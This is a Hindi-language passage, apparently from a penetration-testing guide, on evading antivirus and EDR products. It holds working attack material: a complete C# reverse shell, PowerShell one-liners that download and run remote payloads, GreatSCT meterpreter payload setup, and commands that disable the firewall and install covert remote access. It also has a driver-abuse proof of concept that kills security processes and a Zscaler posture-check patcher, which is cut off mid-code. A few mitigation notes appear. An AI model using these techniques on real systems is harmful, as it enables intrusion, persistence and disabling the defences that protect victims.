   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   इस चरण के बाद आपको opaque wrapper functions (`Class8.smethod_10`, …) के बजाय सामान्य .NET API जैसे `Convert.FromBase64String` या `AES.Create()` दिखाई देने चाहिए।

4.  मैन्युअल सफ़ाई – परिणामी binary को dnSpy में चलाएँ और बड़े Base64 blobs या `RijndaelManaged`/`TripleDESCryptoServiceProvider` के उपयोग को खोजें, ताकि *असली* payload का पता लगाया जा सके। अक्सर malware इसे `<Module>.byte_0` के अंदर initialized TLV-encoded byte array के रूप में रखता है।

यह क्रम malicious sample चलाए **बिना** execution flow को बहाल करता है – offline workstation पर काम करते समय उपयोगी।

> 🛈  ConfuserEx `ConfusedByAttribute` नाम का custom attribute बनाता है, जिसका उपयोग samples की स्वचालित triage के लिए IOC के रूप में किया जा सकता है।

#### एक-लाइनर
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): इस project का लक्ष्य [LLVM](http://www.llvm.org/) compilation suite का एक open-source fork उपलब्ध कराना है, जो [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) और tamper-proofing के माध्यम से बेहतर software security प्रदान कर सके।
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator दिखाता है कि किसी external tool का उपयोग किए बिना और compiler में बदलाव किए बिना, compile time पर obfuscated code बनाने के लिए `C++11/14` language का उपयोग कैसे किया जा सकता है।
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework द्वारा जनरेट किए गए obfuscated operations की एक layer जोड़ें, जिससे application को crack करने की कोशिश करने वाले व्यक्ति का काम थोड़ा कठिन हो जाएगा।
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz एक x64 binary obfuscator है, जो विभिन्न PE files को obfuscate कर सकता है, जिनमें .exe, .dll, .sys शामिल हैं।
- [**metame**](https://github.com/a0rtega/metame): Metame arbitrary executables के लिए एक simple metamorphic code engine है।
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) का उपयोग करके LLVM-supported languages के लिए एक fine-grained code obfuscation framework है। ROPfuscator, regular instructions को ROP chains में बदलकर assembly code level पर program को obfuscate करता है, जिससे सामान्य control flow की हमारी सहज अवधारणा बाधित होती है।
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim में लिखा गया .NET PE Crypter है।
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor मौजूदा EXE/DLL को shellcode में बदलकर उन्हें load कर सकता है।

### LLVM compiler-सहायता से per-function self-masking

किसी implant को केवल उसके सोते समय mask करने के बजाय, एक modified LLVM X86 backend चुने गए functions को निष्क्रिय रहने पर XOR-masked रख सकता है। Function Peekaboo PoC, `REG_` वाले demangled names चुनता है, अंतिम machine code के चारों ओर position-independent entry/exit stubs जोड़ता है, और `.text` में एक shared masking handler emit करता है; source-level signatures और Windows x64 calling convention अपरिवर्तित रहते हैं।<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

यह instruction selection और optimization के बाद होना चाहिए, क्योंकि transformation में **हर emitted return** शामिल होना चाहिए और x86 का सटीक layout पता होना चाहिए। एक pre-emission `MachineFunctionPass`, आखिरी `MachineInstr::isReturn()` ढूँढ़ता है, उसे हटा देता है ताकि अंतिम path appended epilogue में fall through करे, और पहले के returns को `JMP_1 handler` से बदल देता है। हर return से पहले मौजूद compiler-generated stack/frame teardown को बनाए रखें; केवल return instruction को redirect करें।<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` और `emitFunctionBodyEnd()` per-function stubs emit करते हैं, जबकि `emitEndOfAsmFile()` handler emit करता है। Emission stages में साझा symbols से prologue branch अपने बाद में आने वाले epilogue को target कर सकता है; manually emitted near `je` के लिए, `0F 84` के बाद चार-byte MC expression `target - address_after_je` लिखें। Handler तक calls और jumps को `MCInst` objects (`CALL64pcrel32` और `JMP_1`) के रूप में emit किया जा सकता है। जब किसी unselected function में कोई बदलाव न हुआ हो, तो pass को `false` लौटाना चाहिए; PoC इस path पर गलत तरीके से `true` लौटाता है।<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata और pre-CRT initialization

PoC `.funcmeta` में एक XOR key और 16-byte records रखता है, जिनमें loader-relocated function pointer और runtime length होती है। हालाँकि C field `uint32_t` है, handler record offset `+8` पर QWORD access करता है, जिससे length और उसका padding consume होता है, और records को `0x10` से आगे बढ़ाता है। PE section names केवल आठ bytes के होते हैं, इसलिए runtime lookup में `.funcmet` दिखता है। एक external patcher executable `.stub` जोड़ता है, stub में पुराना entry-point RVA सहेजता है, और `AddressOfEntryPoint` को redirect करता है; PIC stub, `gs:[0x60]` → `[PEB+0x10]` से image base प्राप्त करता है, PE32+ imports में पहले से imported `VirtualProtect` को resolve करने के लिए चलता है, और CRT से पहले चलता है।<sup>[[38]](#references)[[39]](#references)</sup>

Initialization, `gs:[0xE8]` में एक sentinel set करता है और हर metadata function को call करता है। उसका हमेशा readable prologue, function start को `gs:[0xF0]` में record करता है, sentinel का पता लगाता है, और अभी-clear body को छोड़ देता है। इसके बाद epilogue `call handler` का उपयोग करता है; handler के 13 registers (`0x68` bytes) save करने के बाद, `[rsp+0x68]` पर return address transformed function का end होता है, इसलिए `end - start` उसकी metadata record में लिखा जा सकता है। सभी bodies के masked हो जाने के बाद stub sentinel clear करता है और `ImageBase + original_entry_point_RVA` पर jump करता है।<sup>[[38]](#references)[[39]](#references)</sup>

सामान्य call के दौरान, prologue body को decode करने के लिए उसी symmetric handler को call करता है। अंतिम path appended epilogue में fall through करता है, जबकि हर पहले का return सीधे shared handler पर jump करता है। सामान्य epilogue भी `call` के बजाय `jmp handler` का उपयोग करता है, ताकि re-masking के बाद handler का `ret`, original caller का return address consume करे और function result को `RAX` में सुरक्षित रखे।<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive और analysis indicators

Handler मौजूदा record ढूँढ़ता है, fixed visible prologue (`इस build में 0x46` bytes) को छोड़ता है, बाकी हिस्से को `PAGE_EXECUTE_READWRITE` में बदलता है, उसे low key byte के साथ byte-by-byte XOR करता है, और फिर उसे `PAGE_EXECUTE_READ` पर set करता है। इसलिए वही loop entry पर decode करता है और हर सामान्य exit पर encode करता है।<sup>[[38]](#references)[[39]](#references)</sup>

इस design के high-signal indicators में शामिल हैं:<sup>[[38]](#references)[[39]](#references)</sup>

- एक executable `.stub` के भीतर entry point और एक `.funcmet` section, जिसमें key तथा relocated `.text` pointers हों;
- pre-CRT PEB, import-table और section-table parsing, जिसके बाद हर metadata pointer के माध्यम से calls हों;
- एक जैसे `call`/`pop` PIC prologues और कई return sites का एक handler पर redirect होना;
- `gs:[0xE8]`, `gs:[0xF0]` और `gs:[0xF8]` में writes, जिनके बाद बार-बार `VirtualProtect` transitions और image-backed executable pages में bytewise XOR writes हों।

यह memory-scanner evasion है, cryptographic protection नहीं: patched file में original clear body अब भी मौजूद रहती है, और debugger, `VirtualProtect` या XOR loop पर break करके active function dump कर सकता है। Single-byte XOR, readable metadata और fixed `0x46` boundary भी offline recovery को आसान बनाते हैं।<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoC के TEB slots thread-local हैं, लेकिन modified code pages process-wide हैं। इसलिए concurrent या recursive entry के दौरान instructions दोबारा toggle हो सकती हैं, जबकि कोई दूसरी invocation उन्हें execute कर रही हो; exceptions और nonlocal exits भी re-masking को bypass कर सकते हैं। एक robust implementation को transitions synchronize करने चाहिए, `lpflOldProtect` के माध्यम से वास्तव में लौटाई गई protection restore करनी चाहिए, hard-coded stub lengths से बचना चाहिए, x64 stack alignment के लिए `call` और `jmp` दोनों paths का audit करना चाहिए, और executable bytes rewrite करने के बाद `FlushInstructionCache` call करना चाहिए। Microsoft स्पष्ट रूप से executable code में बदलाव होने पर instruction-cache coherency की ज़िम्मेदारी caller पर डालता है।<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

इंटरनेट से कुछ executables download करके उन्हें execute करते समय आपने यह screen देखी होगी।

Microsoft Defender SmartScreen एक security mechanism है, जिसका उद्देश्य end user को संभावित रूप से malicious applications चलाने से बचाना है।

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen मुख्य रूप से reputation-based approach पर काम करता है। इसका मतलब है कि कम download की जाने वाली applications SmartScreen को trigger करेंगी, जिससे end user को alert किया जाएगा और file execute करने से रोका जाएगा (हालाँकि More Info -> Run anyway पर click करके file को फिर भी execute किया जा सकता है)।

**MoTW** (Mark of The Web), `Zone.Identifier` नाम का एक [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) है, जो इंटरनेट से file download होने पर उस URL के साथ अपने आप बनाया जाता है जहाँ से इसे download किया गया था।

<figure><img src="../images/image (237).png" alt=""><figcaption><p>इंटरनेट से download की गई file के लिए Zone.Identifier ADS की जाँच करना।</p></figcaption></figure>

> [!TIP]
> ध्यान दें कि **trusted** signing certificate से signed executables **SmartScreen trigger नहीं करेंगे**।

अपने payloads को Mark of The Web से बचाने का एक बेहद प्रभावी तरीका उन्हें ISO जैसे किसी container के अंदर package करना है। ऐसा इसलिए होता है क्योंकि Mark-of-the-Web (MOTW) को **non NTFS** volumes पर लागू **नहीं** किया जा सकता।

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) एक ऐसा tool है, जो Mark-of-the-Web से बचने के लिए payloads को output containers में package करता है।

उदाहरण के लिए उपयोग:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

यह [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) का उपयोग करके ISO फ़ाइलों के अंदर payloads पैकेज करके SmartScreen को bypass करने का डेमो है।

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), Windows में एक शक्तिशाली logging mechanism है, जो applications और system components को **events log** करने देता है। हालाँकि, security products इसका उपयोग malicious activities को monitor और detect करने के लिए भी कर सकते हैं।

AMSI को disable (bypass) करने की तरह, user space process के **`EtwEventWrite`** function को भी इस तरह बनाया जा सकता है कि वह कोई event log किए बिना तुरंत लौट आए। इसके लिए function को memory में patch करके तुरंत लौटने के लिए बनाया जाता है, जिससे उस process के लिए ETW logging प्रभावी रूप से disable हो जाती है।

आपको अधिक जानकारी **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) और [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** पर मिल सकती है।<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# binaries को memory में load करने का तरीका काफी समय से जाना जाता है और AV की पकड़ में आए बिना अपने post-exploitation tools चलाने के लिए यह अब भी एक बेहतरीन तरीका है।

क्योंकि payload सीधे memory में load होगा और disk को नहीं छुएगा, इसलिए हमें केवल पूरे process के लिए AMSI patch करने की चिंता करनी होगी।

ज़्यादातर C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, आदि) पहले से ही C# assemblies को सीधे memory में execute करने की क्षमता देते हैं, लेकिन ऐसा करने के अलग-अलग तरीके हैं:

- **Fork\&Run**

इसमें **एक नया sacrificial process spawn करना**, अपने post-exploitation malicious code को उस नए process में inject करना, अपना malicious code execute करना और काम पूरा होने पर नए process को kill करना शामिल है। इसके फायदे और नुकसान, दोनों हैं। Fork and run method का फायदा यह है कि execution हमारे Beacon implant process के **बाहर** होता है। इसका मतलब है कि अगर हमारी post-exploitation कार्रवाई में कुछ गड़बड़ हो जाए या हम पकड़ में आ जाएँ, तो हमारे **implant के बचने की संभावना** काफी ज़्यादा होती है। इसका नुकसान यह है कि **Behavioural Detections** द्वारा पकड़े जाने की **संभावना ज़्यादा** होती है।

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

इसमें post-exploitation malicious code को **उसके अपने process में** inject किया जाता है। इस तरह, आप नया process बनाने और उसे AV से scan करवाने से बच सकते हैं। लेकिन नुकसान यह है कि अगर आपके payload के execution में कुछ गड़बड़ हो जाए, तो **अपना beacon खोने की संभावना काफी ज़्यादा** होती है, क्योंकि वह crash हो सकता है।

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> अगर आप C# Assembly loading के बारे में और पढ़ना चाहते हैं, तो यह article देखें [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) और उनका InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

आप C# Assemblies को **PowerShell से भी** load कर सकते हैं। [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) और [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) देखें।

## अन्य Programming Languages का उपयोग

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) में सुझाए गए तरीके के अनुसार, compromised machine को **Attacker Controlled SMB share पर install किए गए interpreter environment** का access देकर अन्य languages का उपयोग करके malicious code execute करना संभव है।

SMB share पर Interpreter Binaries और environment का access देकर, आप compromised machine की **memory के अंदर इन languages में arbitrary code execute** कर सकते हैं।

repo के अनुसार: Defender अब भी scripts को scan करता है, लेकिन Go, Java, PHP आदि का उपयोग करके हमें **static signatures को bypass करने की अधिक flexibility** मिलती है। इन languages में random, un-obfuscated reverse shell scripts के साथ testing सफल रही है।

## TokenStomping

Token stomping, EDR या AV जैसे security product के access token में बदलाव करता है। Token के privileges कम करने से process चलता रह सकता है, लेकिन उसे privileged inspection या remediation actions करने से रोका जा सकता है।

इसे रोकने के लिए Windows **बाहरी processes को** security processes के tokens के handles प्राप्त करने से रोक सकता है।

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Trusted Software का उपयोग

### Chrome Remote Desktop

[**इस blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) में बताए अनुसार, पीड़ित के PC पर Chrome Remote Desktop deploy करना और फिर उसका उपयोग करके उस पर नियंत्रण पाना और persistence बनाए रखना आसान है:<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ से download करें, "Set up via SSH" पर click करें और फिर MSI file download करने के लिए Windows की MSI file पर click करें।
2. Victim पर installer को silently run करें (admin आवश्यक है): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop page पर वापस जाएँ और next पर click करें। इसके बाद wizard आपसे authorize करने को कहेगा; आगे बढ़ने के लिए Authorize button पर click करें।
4. दिए गए command को ज़रूरी बदलावों के साथ execute करें: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (`--pin` parameter GUI का उपयोग किए बिना PIN सेट करता है)।
 

## Advanced Evasion

Evasion एक बहुत जटिल विषय है। कभी-कभी आपको एक ही system में telemetry के कई अलग-अलग sources को ध्यान में रखना पड़ता है, इसलिए mature environments में पूरी तरह undetected रहना लगभग असंभव है।

आप जिस भी environment के विरुद्ध काम करेंगे, उसकी अपनी खूबियाँ और कमज़ोरियाँ होंगी।

मैं आपको [@ATTL4S](https://twitter.com/DaniLJ94) की यह talk देखने की पुरज़ोर सलाह देता हूँ, ताकि आपको अधिक Advanced Evasion techniques की शुरुआती समझ मिल सके।


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Evasion in Depth के बारे में [@mariuszbit](https://twitter.com/mariuszbit) की यह एक और बेहतरीन talk है।


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **पुरानी Techniques**

### **जाँचें कि Defender को कौन-से हिस्से malicious लगते हैं**

आप [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) का उपयोग कर सकते हैं, जो **binary के हिस्सों को हटाता रहता है**, जब तक उसे **यह पता नहीं चल जाता कि Defender किस हिस्से को** malicious मान रहा है, और फिर वह हिस्सा आपको अलग करके देता है।\
इसी **काम को करने वाला एक और tool है** [**avred**](https://github.com/dobin/avred), जो [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) पर यह service open web पर उपलब्ध कराता है।

### **Telnet Server**

Windows10 तक, सभी Windows versions में एक **Telnet server** आता था, जिसे आप (administrator के रूप में) इस तरह install कर सकते थे:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

इसे सिस्टम शुरू होने पर **शुरू** करें और इसे अभी **चलाएँ**:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Telnet port बदलें (stealth) और firewall disable करें:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

इसे यहाँ से डाउनलोड करें: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (आपको bin downloads चाहिए, setup नहीं)

**HOST पर**: _**winvnc.exe**_ चलाएँ और server configure करें:

- _Disable TrayIcon_ विकल्प enable करें
- _VNC Password_ में password सेट करें
- _View-Only Password_ में password सेट करें

फिर, binary _**winvnc.exe**_ और नई बनाई गई file _**UltraVNC.ini**_ को **victim** पर ले जाएँ

#### **Reverse connection**

**attacker** को अपने **host** पर binary `vncviewer.exe -listen 5900` चलानी चाहिए, ताकि वह reverse **VNC connection** पाने के लिए तैयार रहे। फिर, **victim** पर: winvnc daemon शुरू करें `winvnc.exe -run` और `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` चलाएँ

**WARNING:** stealth बनाए रखने के लिए आपको कुछ काम नहीं करने चाहिए

- अगर `winvnc` पहले से चल रहा है, तो उसे शुरू न करें, वरना [popup](https://i.imgur.com/1SROTTl.png) दिखेगा। `tasklist | findstr winvnc` से जाँचें कि यह चल रहा है या नहीं
- `UltraVNC.ini` को उसी directory में रखे बिना `winvnc` शुरू न करें, वरना [config window](https://i.imgur.com/rfMQWcf.png) खुल जाएगी
- Help के लिए `winvnc -h` न चलाएँ, वरना [popup](https://i.imgur.com/oc18wcu.png) दिखेगा

### GreatSCT

इसे यहाँ से डाउनलोड करें: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

GreatSCT के अंदर:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

अब `msfconsole -r file.rc` के साथ **lister** शुरू करें और **xml payload** निष्पादित करें:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**मौजूदा Defender process को बहुत तेज़ी से terminate कर देगा।**

### अपना reverse shell compile करना

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### पहला C# Revershell

इसे इससे compile करें:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

इसे इसके साथ उपयोग करें:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# compiler का उपयोग

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

स्वचालित डाउनलोड और निष्पादन:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators की सूची: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

### injectors बनाने के लिए python का उपयोग करने का उदाहरण:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### अन्य tools

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### अधिक

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## अपना Vulnerable Driver लाएँ (BYOVD) – Kernel Space से AV/EDR को खत्म करना

Storm-2603 ने ransomware डालने से पहले endpoint protections को disable करने के लिए **Antivirus Terminator** नाम की एक छोटी console utility का इस्तेमाल किया। यह tool अपना **vulnerable लेकिन *signed* driver** साथ लाता है और इसका दुरुपयोग करके privileged kernel operations करता है, जिन्हें Protected-Process-Light (PPL) AV services भी रोक नहीं सकतीं।<sup>[[12]](#references)</sup>

मुख्य बातें
1. **Signed driver**: disk पर दी गई file `ServiceMouse.sys` है, लेकिन binary Antiy Labs के “System In-Depth Analysis Toolkit” का वैध रूप से signed driver `AToolsKrnl64.sys` है। चूँकि driver पर मान्य Microsoft signature है, इसलिए Driver-Signature-Enforcement (DSE) enabled होने पर भी यह load हो जाता है।
2. **Service installation**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   पहली लाइन driver को **kernel service** के रूप में रजिस्टर करती है और दूसरी उसे शुरू करती है, जिससे `\\.\ServiceMouse` user land से ऐक्सेस किया जा सकता है।
3. **Driver द्वारा उपलब्ध कराए गए IOCTLs**
   | IOCTL code | क्षमता                                  |
   |-----------:|-----------------------------------------|
   | `0x99000050` | PID के ज़रिए किसी भी process को terminate करना (Defender/EDR services को kill करने के लिए इस्तेमाल किया जाता है) |
   | `0x990000D0` | डिस्क पर मौजूद किसी भी file को delete करना |
   | `0x990001D0` | driver को unload करना और service को remove करना |

   न्यूनतम C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **यह क्यों काम करता है**: BYOVD user-mode protections को पूरी तरह छोड़ देता है; kernel में execute होने वाला code *protected* processes खोल सकता है, उन्हें terminate कर सकता है, या PPL/PP, ELAM अथवा अन्य hardening features की परवाह किए बिना kernel objects के साथ छेड़छाड़ कर सकता है।

पता लगाना / Mitigation
•  Microsoft की vulnerable-driver block list (`HVCI`, `Smart App Control`) enable करें, ताकि Windows `AToolsKrnl64.sys` को load करने से इनकार करे।
•  नई *kernel* services के निर्माण पर नज़र रखें और alert दें, जब कोई driver world-writable directory से load हो या allow-list में मौजूद न हो।
•  custom device objects के लिए user-mode handles और उसके बाद होने वाली संदिग्ध `DeviceIoControl` calls पर नज़र रखें।

### डिस्क पर मौजूद बाइनरी patch करके Zscaler Client Connector के Posture Checks को bypass करना

Zscaler का **Client Connector** device-posture rules को स्थानीय रूप से लागू करता है और परिणामों को अन्य components तक पहुँचाने के लिए Windows RPC पर निर्भर करता है। डिज़ाइन के दो कमज़ोर विकल्पों के कारण इसे पूरी तरह bypass करना संभव है:

1. Posture evaluation **पूरी तरह client-side** होता है (server को एक boolean भेजा जाता है)।
2. Internal RPC endpoints केवल यह validate करते हैं कि connecting executable **Zscaler द्वारा signed** है (`WinVerifyTrust` के ज़रिए)।<sup>[[11]](#references)</sup>

**डिस्क पर मौजूद चार signed binaries को patch करके**, दोनों mechanisms को निष्प्रभावी किया जा सकता है:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | हमेशा `1` लौटाता है, इसलिए हर check compliant होता है |
| `ZSAService.exe` | `WinVerifyTrust` को indirect call | NOP-ed ⇒ कोई भी process (भले ही unsigned हो) RPC pipes से bind कर सकता है |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` से बदला गया |
| `ZSATunnel.exe` | Tunnel पर integrity checks | Short-circuited |

Minimal patcher excerpt:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
